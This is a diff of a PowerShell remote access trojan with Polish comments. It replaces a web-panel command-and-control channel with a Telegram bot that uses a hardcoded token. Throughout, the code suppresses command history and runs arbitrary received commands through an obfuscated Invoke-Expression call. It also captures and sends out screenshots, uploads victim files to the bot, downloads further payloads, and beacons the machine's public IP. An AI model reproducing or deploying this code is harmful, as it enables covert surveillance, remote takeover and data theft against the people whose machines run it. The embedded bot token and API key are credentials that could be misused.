@@ -2,41 +2,36 @@ Clear-Host
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Set-Location -Path $env:USERPROFILE
 
-# ── Konfiguracja ──────────────────────────────────────────────────────────────
-$server_url = "https://pmcwar.com/opec/opec"   # <-- zmień
-$api_key    = "gY8KsXhami4pk6t9ObW2VZLAJzGToeDRqfQInSuU"         # <-- zmień (ten sam co w config.php)
-$session_id = $env:COMPUTERNAME
-$Global:ProgressPreference = 'SilentlyContinue'
+$session                    = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+$telegram_id, $api_token    = "2118389773", "8450505822:AAG_yBZaOGpYdKN4dFZTfEtNF_Vfk_71YQ0"
+$api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
+$api_send_messages          = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
+$api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
+$api_download_file          = 'https://api.telegram.org/file/bot{0}/' -f $api_token
+$api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
+$session_id                 = $env:COMPUTERNAME
+$Global:ProgressPreference  = 'SilentlyContinue'
 
-$headers = @{ "X-API-Key" = $api_key }
-
-# ── Cache IP ──────────────────────────────────────────────────────────────────
-$script:cached_ip    = "N/A"
-$script:cached_ip_at = [DateTime]::MinValue
+# Cache publicznego IP - odswiezany co 5 min zamiast wolania ident.me przy kazdej wiadomosci
+$script:cached_ip       = "N/A"
+$script:cached_ip_at    = [DateTime]::MinValue
 
 function GetPublicIP {
     if (((Get-Date) - $script:cached_ip_at).TotalMinutes -gt 5) {
         try {
-            $script:cached_ip    = Invoke-RestMethod -Uri "ident.me" -TimeoutSec 3
+            $script:cached_ip    = Invoke-RestMethod -Uri "ident.me" -TimeoutSec 3 -WebSession $session
             $script:cached_ip_at = Get-Date
         } catch { }
     }
     return $script:cached_ip
 }
 
-# ── WinAPI ────────────────────────────────────────────────────────────────────
-Add-Type @"
-    using System;
-    using System.Text;
-    using System.Runtime.InteropServices;
-    public class WinAPI {
-        [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
-        [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
-        [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
-    }
-"@ -ErrorAction SilentlyContinue
+# Wewnatrz MarkdownV2 code-bloka eskejpowac trzeba TYLKO ` i \
+function EscapeMd($text) {
+    if ($null -eq $text) { return "" }
+    return [regex]::Replace([string]$text, '([`\\])', '\$1')
+}
 
-# ── Funkcje pomocnicze ────────────────────────────────────────────────────────
 function CheckAdminRights {
     $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
     $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -44,160 +39,148 @@ function CheckAdminRights {
     else           { return "Użytkownik '$env:USERNAME' nie ma uprawnień administratora" }
 }
 
-function GetActiveWindow {
+function DownloadUrl($url, $dest) {
     try {
-        $hwnd = [WinAPI]::GetForegroundWindow()
-        $sb   = New-Object System.Text.StringBuilder 256
-        [WinAPI]::GetWindowText($hwnd, $sb, 256) | Out-Null
-        $pid_out = 0
-        [WinAPI]::GetWindowThreadProcessId($hwnd, [ref]$pid_out) | Out-Null
-        $proc = (Get-Process -Id $pid_out -ErrorAction SilentlyContinue).Name
-        return "Proces: $proc`nTytuł:  $($sb.ToString())"
-    } catch { return "Błąd: $($_.Exception.Message)" }
+        $fileName = if ($dest -and $dest.Length -gt 0) {
+            $dest
+        } else {
+            Split-Path -Leaf ([Uri]$url).LocalPath
+        }
+        if (-not $fileName -or $fileName.Length -eq 0) { $fileName = "downloaded_file" }
+
+        Invoke-WebRequest -Uri $url -OutFile $fileName -TimeoutSec 30
+        if (Test-Path $fileName) { SendMessage "Pobrano: $fileName" "" }
+        else                     { SendMessage "Plik nie został zapisany" "" }
+    } catch { SendMessage "Błąd pobierania: $($_.Exception.Message)" "" }
 }
 
-function UploadFile($filePath) {
+function DownloadFile($file_id, $file_name) {
     try {
-        curl.exe -s -F "file=@$filePath" -F "session_id=$session_id" `
-            -H "X-API-Key: $api_key" "$server_url/api.php?action=upload" | Out-Null
-    } catch { }
-}
-
-function CaptureScreenshot {
-    [void][Reflection.Assembly]::LoadWithPartialName("System.Drawing")
-    [void][Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
-    $l = [Int32]::MaxValue; $t = [Int32]::MaxValue
-    $r = [Int32]::MinValue; $b = [Int32]::MinValue
-    foreach ($scr in [Windows.Forms.Screen]::AllScreens) {
-        if ($scr.Bounds.X -lt $l)                              { $l = $scr.Bounds.X }
-        if ($scr.Bounds.Y -lt $t)                              { $t = $scr.Bounds.Y }
-        if ($scr.Bounds.X + $scr.Bounds.Width  -gt $r)        { $r = $scr.Bounds.X + $scr.Bounds.Width }
-        if ($scr.Bounds.Y + $scr.Bounds.Height -gt $b)        { $b = $scr.Bounds.Y + $scr.Bounds.Height }
-    }
-    $bounds = [Drawing.Rectangle]::FromLTRB($l, $t, $r, $b)
-    $bmp    = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
-    $gfx    = [Drawing.Graphics]::FromImage($bmp)
-    $gfx.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
-    $path = "$env:APPDATA\screenshot.png"
-    $bmp.Save($path); $gfx.Dispose(); $bmp.Dispose()
-    return $path
+        $get_file_path = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
+        $file_path     = $get_file_path.result.file_path
+        Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session
+        if (Test-Path -Path $file_name) { SendMessage "Plik został pobrany pomyślnie" "" }
+        else                            { SendMessage "Plik nie został pobrany" "" }
+    } catch { SendMessage "Błąd pobierania pliku: $($_.Exception.Message)" "" }
 }
 
 function SendFile($filePath) {
-    if (Test-Path $filePath -PathType Leaf) {
-        UploadFile $filePath
-        return "Plik przesłany: $filePath"
+    SendMessage "Przystępuję do wysłania pliku [$filePath]" ""
+    if (Test-Path -Path $filePath -PathType Leaf) {
+        try   { curl.exe -F document=@"$filePath" $api_upload_file | Out-Null }
+        catch { SendMessage "Błąd podczas przesyłania pliku: [$($Error[0])]" "" }
     }
-    return "Plik nie znaleziony: $filePath"
+    else { SendMessage "Wskazany plik nie został znaleziony" "" }
 }
 
 function SendScreenshot {
-    $path = CaptureScreenshot
-    UploadFile $path
-    Remove-Item $path -Force
-    return "Screenshot przesłany do panelu"
+    [void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+    [void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+    $left = [Int32]::MaxValue; $top = [Int32]::MaxValue
+    $right = [Int32]::MinValue; $bottom = [Int32]::MinValue
+    foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
+        if ($screen.Bounds.X -lt $left)                           { $left   = $screen.Bounds.X }
+        if ($screen.Bounds.Y -lt $top)                            { $top    = $screen.Bounds.Y }
+        if ($screen.Bounds.X + $screen.Bounds.Width  -gt $right)  { $right  = $screen.Bounds.X + $screen.Bounds.Width }
+        if ($screen.Bounds.Y + $screen.Bounds.Height -gt $bottom) { $bottom = $screen.Bounds.Y + $screen.Bounds.Height }
+    }
+    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)
+    $bmp      = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
+    $graphics = [Drawing.Graphics]::FromImage($bmp)
+    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+    $path = "$env:APPDATA\screenshot.png"
+    $bmp.Save($path)
+    $graphics.Dispose()
+    $bmp.Dispose()
+    SendFile $path
+    Remove-Item -Path $path -Force
 }
 
-# ── Komunikacja z serwerem ────────────────────────────────────────────────────
-function SendHeartbeat {
-    $body = @{
-        session_id = $session_id
-        ip         = (GetPublicIP)
-        path       = (Get-Location).Path
-        user       = $env:USERNAME
+function SendMessage($output, $cmd) {
+    $ip   = EscapeMd (GetPublicIP)
+    $sid  = EscapeMd $session_id
+    $path = EscapeMd ((Get-Location).Path.Replace('\','/'))
+    $c    = EscapeMd $cmd
+    $o    = EscapeMd $output
+
+    $MessageToSend = @{
+        chat_id    = $telegram_id
+        parse_mode = "MarkdownV2"
+        text       = "```````nIP: $ip`nSESSION ID: $sid`nPATH: [$path]`nCMD: $c`n`n$o`n``````"
     } | ConvertTo-Json
+
     try {
-        Invoke-RestMethod -Method Post -Uri "$server_url/api.php?action=heartbeat" `
-            -Body $body -ContentType "application/json; charset=utf-8" -Headers $headers | Out-Null
-    } catch { }
+        Invoke-RestMethod -Method Post -Uri $api_send_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
+    } catch { Start-Sleep -Seconds 3 }
 }
 
-function PollCommand {
-    try {
-        return Invoke-RestMethod -Uri "$server_url/api.php?action=poll&session_id=$session_id" `
-            -Headers $headers -TimeoutSec 10
-    } catch { return $null }
-}
-
-function SendResult($command_id, $output) {
-    $body = @{
-        command_id = $command_id
-        session_id = $session_id
-        output     = $output
-        path       = (Get-Location).Path
-    } | ConvertTo-Json
-    try {
-        Invoke-RestMethod -Method Post -Uri "$server_url/api.php?action=result" `
-            -Body $body -ContentType "application/json; charset=utf-8" -Headers $headers | Out-Null
-    } catch { }
-}
-
-# ── Obsługa komendy ───────────────────────────────────────────────────────────
-function ProcessCommand($obj) {
-    $cmd_id = $obj.id
-    $type   = $obj.type
-    $cmd    = $obj.cmd
-
-    if ($type -eq 'download_url') {
-        $url  = $obj.data.url
-        $name = $obj.data.file_name
-        try {
-            Invoke-WebRequest -Uri $url -OutFile $name -TimeoutSec 30 -Headers $headers
-            SendResult $cmd_id "Plik pobrany: $name"
-        } catch {
-            SendResult $cmd_id "Błąd pobierania: $($_.Exception.Message)"
-        }
-        return
-    }
-
-    # Aliasy
-    $aliases = @{
-        'getip'   = 'GetPublicIP'
-        'chadmin' = 'CheckAdminRights'
-        'ss'      = 'SendScreenshot'
-        'sf'      = 'SendFile'
-        'active'  = 'GetActiveWindow'
-    }
-    $first = ($cmd -split ' ', 2)[0].ToLower()
-    if ($aliases.ContainsKey($first)) {
-        $rest = if (($cmd -split ' ', 2).Count -gt 1) { ' ' + ($cmd -split ' ', 2)[1] } else { '' }
-        $cmd  = $aliases[$first] + $rest
-    }
-
-    if ($cmd -eq 'exit') { SendResult $cmd_id "Sesja zakończona"; exit }
-
-    $output = ''
-    try {
-        $f = ($cmd -split ' ', 2)[0]
-        if ($f -eq 'cd' -or $f -eq 'Set-Location') { $cmd = $cmd + ' -ErrorAction Stop; ls' }
-        $output = .(Get-Alias ?e[?x])($cmd) | Out-String
-    } catch { $output = $Error[0] | Out-String }
-
-    if ([string]::IsNullOrWhiteSpace($output)) { $output = "Polecenie wykonane: $cmd" }
-
-    for ($i = 0; $i -lt $output.Length; $i += 4000) {
-        SendResult $cmd_id $output.Substring($i, [Math]::Min(4000, $output.Length - $i))
-    }
-}
-
-# ── Główna pętla ──────────────────────────────────────────────────────────────
-function MainLoop {
+function CommandListener {
     Add-Type -AssemblyName System.Windows.Forms
-    $last_hb = [DateTime]::MinValue
+    [System.Windows.Forms.Cursor]::Position = [System.Windows.Forms.Cursor]::Position
+
+    # Skip starych wiadomosci przy starcie: ustaw offset za ostatnim update_id
+    $offset = 0
+    try {
+        $init = Invoke-RestMethod -Method Get -Uri "$api_get_updates`?timeout=0" -WebSession $session
+        if ($init.result.Count -gt 0) { $offset = $init.result[-1].update_id + 1 }
+    } catch { }
+
+    SendMessage "Sesja aktywna!" ""
 
     while ($true) {
-        if (((Get-Date) - $last_hb).TotalSeconds -gt 30) {
-            SendHeartbeat
-            $last_hb = Get-Date
-        }
-
         try {
-            $obj = PollCommand
-            if ($null -ne $obj) {
-                ProcessCommand $obj
-                # Natychmiast polluj ponownie — może być kolejna komenda
-            } else {
-                Start-Sleep -Seconds 2
+            # Long-polling: zadanie wisi do 30s, nie polling co sekunde
+            $url  = "$api_get_updates`?timeout=30&offset=$offset"
+            $resp = Invoke-RestMethod -Method Get -Uri $url -WebSession $session -TimeoutSec 35
+
+            foreach ($update in $resp.result) {
+                $offset = $update.update_id + 1
+                $msg    = $update.message
+                if (-not $msg) { continue }
+
+                $user_id  = $msg.chat.id
+                $username = $msg.chat.username
+                $text     = $msg.text
+                $document = $msg.document
+
+                if ($user_id -notmatch $telegram_id) {
+                    SendMessage ("Użytkownik [{0}] {1} nieupoważniona osoba wysłała: {2}" -f $user_id, $username, $text) ""
+                }
+
+                if ($text) {
+                    $parts  = $text -split ' ', 2
+                    $target = $parts[0]
+                    $cmd    = if ($parts.Count -gt 1) { $parts[1] } else { '' }
+
+                    if ($cmd -match '/online')         { SendMessage "Sesja aktywna" $cmd }
+                    if ($target -notmatch $session_id) { continue }
+                    if ($cmd -eq 'exit')               { SendMessage "Sesja zabita" $cmd; exit }
+
+                    if ($cmd -match '^dl\s+(\S+)(?:\s+(\S+))?$') {
+                        DownloadUrl $Matches[1] $Matches[2]
+                        continue
+                    }
+
+                    if ($cmd.Length -gt 0) {
+                        try {
+                            $first = ($cmd -split ' ', 2)[0]
+                            if ($first -eq 'cd' -or $first -eq 'Set-Location') { $cmd = $cmd + '; ls' }
+                            $output = .(Get-Alias ?e[?x])($cmd) | Out-String
+                        } catch { $output = $Error[0] | Out-String }
+
+                        if ([string]::IsNullOrWhiteSpace($output)) {
+                            SendMessage ("Polecenie wykonane: " + $cmd) $cmd
+                        } else {
+                            for ($i = 0; $i -lt $output.Length; $i += 2048) {
+                                $chunk = $output.Substring($i, [Math]::Min(2048, $output.Length - $i))
+                                SendMessage $chunk $cmd
+                                Start-Sleep -Milliseconds 100
+                            }
+                        }
+                    }
+                }
+
+                if ($document) { DownloadFile $document.file_id $document.file_name }
             }
         } catch {
             Start-Sleep -Seconds 5
@@ -205,4 +188,4 @@ function MainLoop {
     }
 }
 
-MainLoop
+CommandListener
